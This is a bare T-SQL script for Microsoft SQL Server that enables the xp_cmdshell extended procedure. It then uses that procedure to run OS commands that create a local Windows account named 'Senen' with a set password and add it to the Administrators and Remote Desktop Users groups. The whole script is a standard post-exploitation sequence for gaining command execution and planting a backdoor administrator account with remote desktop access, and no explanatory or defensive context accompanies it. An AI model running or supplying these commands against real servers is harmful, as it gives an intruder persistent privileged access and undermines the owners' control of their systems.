EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
xp_cmdshell 'net user /add Senen SuperSecurePassword'
GO
xp_cmdshell 'net localgroup "Administrators" Senen /add'
GO
xp_cmdshell 'net localgroup "Remote Desktop Users" Senen /add'
GO